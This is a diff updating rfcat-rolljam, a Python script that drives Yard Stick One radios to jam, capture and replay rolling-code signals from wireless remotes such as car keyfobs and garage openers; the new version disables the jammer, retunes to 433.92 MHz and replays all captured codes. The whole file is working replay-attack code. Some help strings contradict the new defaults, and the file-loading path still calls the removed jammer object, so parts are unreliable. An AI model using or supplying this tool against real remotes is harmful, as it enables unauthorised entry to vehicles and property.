@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+#
 #rfcat-rolljam is a python script to "jam", capture, and replay rolling code signals using two yard stick one devices and rfcat.
 #
 #The name rfcat-rolljam is inspired by Samy Kamkar's RollJam which is a device that defeats rolling code security.
@@ -19,7 +21,6 @@
 #Scan and replay of the code is borrowed from Andrew Macpherson's RfCatHelpers https://github.com/AndrewMohawk/RfCatHelpers
 #Combined and lightly modified into something similar to Samy Kamkar's original rolljam by Corey Harding from https://LegacySecurityGroup.com
 
-#!/usr/bin/env python
 
 import sys
 from rflib import *
@@ -30,23 +31,23 @@ import argparse
 import time
 import pickle
 
-parser = argparse.ArgumentParser(description='Python port of Samy Kamkar\'s Rolljam.  Code by Andrew Macpherson, Ghostlulz(Alex), and Corey Harding.',version="1.0")
-parser.add_argument('-f', action="store", default="315060000", dest="baseFreq",help='Target frequency to listen for remote (default: 315060000)',type=int)
-parser.add_argument('-r', action="store", dest="baudRate",default=1818,help='Baudrate (default: 1818)',type=int)
+parser = argparse.ArgumentParser(description='Python port of Samy Kamkar\'s Rolljam.  Code by Andrew Macpherson, Ghostlulz(Alex), and Corey Harding.')
+parser.add_argument('-f', action="store", default="433920000", dest="baseFreq",help='Target frequency to listen for remote (default: 315060000)',type=int)
+parser.add_argument('-r', action="store", dest="baudRate",default=2314,help='Baudrate (default: 1818)',type=int)
 parser.add_argument('-n', action="store", dest="numSignals",default=2,help='Number of signals to capture before replaying (default: 2)',type=int)
 parser.add_argument('-i', action="store", default="24000", dest="chanWidth",help='Width of each channel (lowest being 24000 -- default)',type=int)
-parser.add_argument('-c', action="store", default="60000", dest="chanBW",help='Channel BW for RX (default: 60000)',type=int)
+parser.add_argument('-c', action="store", default="100000", dest="chanBW",help='Channel BW for RX (default: 60000)',type=int)
 parser.add_argument('-I', action="store", default="", dest="inFile",help='File to read in')
 parser.add_argument('-O', action="store", default="", dest="outFile",help='Output file to save captures to')
 parser.add_argument('-o', action="store", default="-70000", dest="offset",help='Frequency offset of jammer (default: -70000)')
 parser.add_argument('-p', action="store", default="200", dest="power",help='Power level for re-transmitting (default: 200)',type=int)
-parser.add_argument('-m', action="store", default="-40", dest="minRSSI",help='Minimum RSSI db to accept signal (default: -40)',type=int)
-parser.add_argument('-M', action="store", default="40", dest="maxRSSI",help='Maximum RSSI db to accept signal (default: 40)',type=int)
+parser.add_argument('-m', action="store", default="-240", dest="minRSSI",help='Minimum RSSI db to accept signal (default: -40)',type=int)
+parser.add_argument('-M', action="store", default="240", dest="maxRSSI",help='Maximum RSSI db to accept signal (default: 40)',type=int)
 parser.add_argument('-k', action="store_true", dest="waitForKeypress", default=False,help='Wait for keypress before resending first capture (default: False)')
 results = parser.parse_args()
 
 rawCapture = [];
-print "Configuring Scanner on Frequency: " + str(results.baseFreq)
+print("Configuring Scanner on Frequency: " + str(results.baseFreq))
 d = RfCat(idx=0)
 d.setMdmModulation(MOD_ASK_OOK)
 d.setFreq(results.baseFreq)
@@ -55,119 +56,127 @@ d.setMdmDRate(results.baudRate)
 d.setMdmChanBW(results.chanBW)
 d.setMdmChanSpc(results.chanWidth)
 d.setChannel(0)
-d.setPower(results.power)
+# d.setPower(results.power)
+d.setMaxPower()
 d.lowball(1)
 
-print "Configuring Jammer on Frequency: " + str(int(results.baseFreq)+int(results.offset))
-c = RfCat(idx=1)
-c.setMdmModulation(MOD_ASK_OOK) #on of key
-c.setFreq(int(results.baseFreq)+int(results.offset)) # frequency
-c.setMdmDRate(results.baudRate)# how long each bit is transmited for
-c.setMdmChanBW(results.chanBW)# how wide channel is
-c.setMdmChanSpc(results.chanWidth)
-c.setChannel(0)
-c.setMaxPower() # max power
-c.lowball(1) # need inorder to read data
+# print("Configuring Jammer on Frequency: " + str(int(results.baseFreq) + int(results.offset)))
+# c = RfCat(idx=1)
+# c.setMdmModulation(MOD_ASK_OOK) #on of key
+# c.setFreq(int(results.baseFreq)+int(results.offset)) # frequency
+# c.setMdmDRate(results.baudRate)# how long each bit is transmited for
+# c.setMdmChanBW(results.chanBW)# how wide channel is
+# c.setMdmChanSpc(results.chanWidth)
+# c.setChannel(0)
+# c.setMaxPower() # max power
+# c.lowball(1) # need inorder to read data
 
 time.sleep(1) #warm up
 
-if(results.inFile != ''):
-	rawCapture = pickle.load(open(results.inFile,"rb"))
-	if(len(rawCapture) == 0):
-		print "No captures found"
-		sys.exit()
-	else:
-		print "Loaded " + str(len(rawCapture)) + " captures"
-	print "Send Phase..."
-	c.setModeIDLE()
-	emptykey = '\x00\x00\x00\x00\x00\x00\x00'
-	d.makePktFLEN(len(emptykey))
-	d.RFxmit(emptykey)
-	while True:
-		try:
-			for i in range(0,len(rawCapture)):
-				key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
-				d.makePktFLEN(len(key_packed))
-				raw_input(" Press enter to send capture " + str(i+1) + " of " + str(len(rawCapture)))
-				d.RFxmit(key_packed)
-				print "Sent " + str(i+1) + " of " + str(len(rawCapture))
-		except KeyboardInterrupt:
-			print "Bye!"
-			d.setModeIDLE()
-			sys.exit()
-			break;
-	print "exiting."
-	d.setModeIDLE()
-	sys.exit()
+def hexdump(data: bytes, offset = 0):
+    def to_printable_ascii(byte):
+        return chr(byte) if 32 <= byte <= 126 else "."
 
-print "Jamming...."
-c.setModeTX() # start transmitting 
+    while offset < len(data):
+        chunk = data[offset : offset + 16]
+        hex_values = " ".join(f"{byte:02x}" for byte in chunk)
+        ascii_values = "".join(to_printable_ascii(byte) for byte in chunk)
+        print(f"{offset:08x}  {hex_values:<48}  {ascii_values}")
+        offset += 16
 
-print "Scanning..."
+if results.inFile != '':
+    rawCapture = pickle.load(open(results.inFile,"rb"))
+    if len(rawCapture) == 0:
+        print("No captures found")
+        sys.exit()
+    else:
+        print("Loaded " + str(len(rawCapture)) + " captures")
+    print("Send Phase...")
+    c.setModeIDLE()
+    emptykey = b'\x00\x00\x00\x00\x00\x00\x00'
+    d.makePktFLEN(len(emptykey))
+    d.RFxmit(emptykey)
+    while True:
+        try:
+            for i in range(0,len(rawCapture)):
+                key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
+                d.makePktFLEN(len(key_packed))
+                input(f"Press enter to send capture {i+1} of {len(rawCapture)}")
+                d.RFxmit(key_packed)
+                print("Sent " + str(i + 1) + " of " + str(len(rawCapture)))
+        except KeyboardInterrupt:
+            print("Bye!")
+            d.setModeIDLE()
+            sys.exit()
+            break;
+    print("exiting.")
+    d.setModeIDLE()
+    sys.exit()
+
+# print("Jamming....")
+# c.setModeTX() # start transmitting
+
+print("Scanning...")
 while True:
-	try:
-		
-		y, t = d.RFrecv(1)
-		sampleString=y.encode('hex')
-		#print sampleString
-		strength= 0 - ord(str(d.getRSSI()))
-		
-		#sampleString = re.sub(r'((f)\2{8,})', '',sampleString)
-		if (re.search(r'((0)\2{15,})', sampleString)):
-			print "Signal Strength:" + str(strength)
-			if(strength > results.minRSSI and strength < results.maxRSSI):
-				rawCapture.append(sampleString)
-				print "Found " + str(sampleString)
-				if(len(rawCapture) >= results.numSignals):
-					break;
-		
-			
-		
-		
-	except ChipconUsbTimeoutException:
-		pass
-	except KeyboardInterrupt:
-		break
-print "Saving phase"
+    try:
+
+        y, t = d.RFrecv(1)
+        strength = 0 - (d.getRSSI()[0])
+        sampleString = y.hex()
+        hexdump(y)
+
+        #sampleString = re.sub(r'((f)\2{8,})', '',sampleString)
+        if re.search(r'((0)\2{15,})', sampleString):
+            print("Signal Strength:" + str(strength))
+            if results.minRSSI < strength < results.maxRSSI:
+                rawCapture.append(sampleString)
+                print("Found " + str(sampleString))
+                if len(rawCapture) >= results.numSignals:
+                    break
+
+    except ChipconUsbTimeoutException:
+        pass
+    except KeyboardInterrupt:
+        break
+print("Saving phase")
 outputCapture = rawCapture
-if(results.outFile != ''):
-	pickle.dump(outputCapture, open(results.outFile,"wb"))
-print "Send Phase..."
+if results.outFile != '':
+    pickle.dump(outputCapture, open(results.outFile,"wb"))
+print("Send Phase...")
 #print rawCapture
-emptykey = '\x00\x00\x00\x00\x00\x00\x00'
+emptykey = b'\x00\x00\x00\x00\x00\x00\x00'
 d.makePktFLEN(len(emptykey))
 d.RFxmit(emptykey)
 
-print 'Done jamming'
-if(results.waitForKeypress == True):
-	time.sleep(.5)  # Assumes someone using waitForKeypress mode is testing thus they will be pressing button on remote
-			# and waiting for the "Done jamming" message, this delay allows their brain to stop pressing the button
-			# don't want to accidentally hop to next code
-c.setModeIDLE() # put dongle in idle mode to stop jamming
+print('Done jamming')
+if results.waitForKeypress:
+    time.sleep(.5)  # Assumes someone using waitForKeypress mode is testing thus they will be pressing button on remote
+            # and waiting for the "Done jamming" message, this delay allows their brain to stop pressing the button
+            # don't want to accidentally hop to next code
+# c.setModeIDLE() # put dongle in idle mode to stop jamming
 
-if(results.waitForKeypress == True):
-	raw_input(" Press enter to send first capture")
-print 'Replaying'
-key_packed = bitstring.BitArray(hex=rawCapture[0]).tobytes()
-d.makePktFLEN(len(key_packed))
-d.RFxmit(key_packed)
-print "Sent capture 1"
+if results.waitForKeypress:
+    input(" Press enter to send first capture")
+print('Replaying')
+# key_packed = bitstring.BitArray(hex=rawCapture[0]).tobytes()
+# d.makePktFLEN(len(key_packed))
+# d.RFxmit(key_packed)
+# print("Sent capture 1")
 
 while True:
-	try:
-		for i in range(1,len(rawCapture)):
+    try:
+        for i in range(0,len(rawCapture)):
 
-			key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
-			raw_input(" Press enter to send capture " + str(i+1) + " of " + str(len(rawCapture)))
-			d.makePktFLEN(len(key_packed))
-			d.RFxmit(key_packed)
-			print "Sent capture " + str(i+1) + " of " + str(len(rawCapture))
-	except KeyboardInterrupt:
-		print "Bye!"
-		d.setModeIDLE()
-		c.setModeIDLE() # put dongle in idle mode to stop jamming
-		sys.exit()
-		break;
-print "exiting."
+            key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
+            input(f"Press enter to send capture {i+1} of {len(rawCapture)}")
+            d.makePktFLEN(len(key_packed))
+            d.RFxmit(key_packed)
+            print(f"Sent capture {i + 1} of {len(rawCapture)}")
+    except KeyboardInterrupt:
+        break
+
+print(" Bye!")
 d.setModeIDLE()
-c.setModeIDLE()
+# c.setModeIDLE()
+
+sys.exit(0)
